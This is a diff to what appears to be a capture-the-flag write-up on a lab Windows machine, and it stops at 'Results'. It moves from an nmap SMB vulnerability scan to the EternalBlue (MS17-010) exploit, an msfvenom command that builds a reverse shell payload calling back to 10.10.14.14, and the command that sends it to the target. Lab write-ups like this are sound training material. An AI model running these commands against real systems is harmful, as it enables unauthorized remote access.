@@ -52,4 +52,20 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Thu Jul  7 18:52:21 2022 -- 1 IP address (1 host up) scanned in 64.24 seconds
 ```
 **Smb vulnerabilities scan:** [nmap -sS -p139,445 10.10.10.4 -v --script vuln]:
-![Smb vulnerabilities scan](smb_scan.png)
+
+![smb_scan](smb_scan.png)
+
+**Initial Shell Vulnerability Exploited: EternalBlue**
+With the results of the nmap vulnerabilities scan, it seems like the machine is vulnerable to [MS017-10](https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py) (EternalBlue Exploit).
+
+I first used msfvenom to generate a payload:
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443
+EXITFUNC=thread -f exe -a x86 --platform windows -o reverseshell.exe
+```
+And then ran the exploit:
+```bash
+python send_and_execute.py 10.10.10.4 revshell.exe
+```
+
+Results
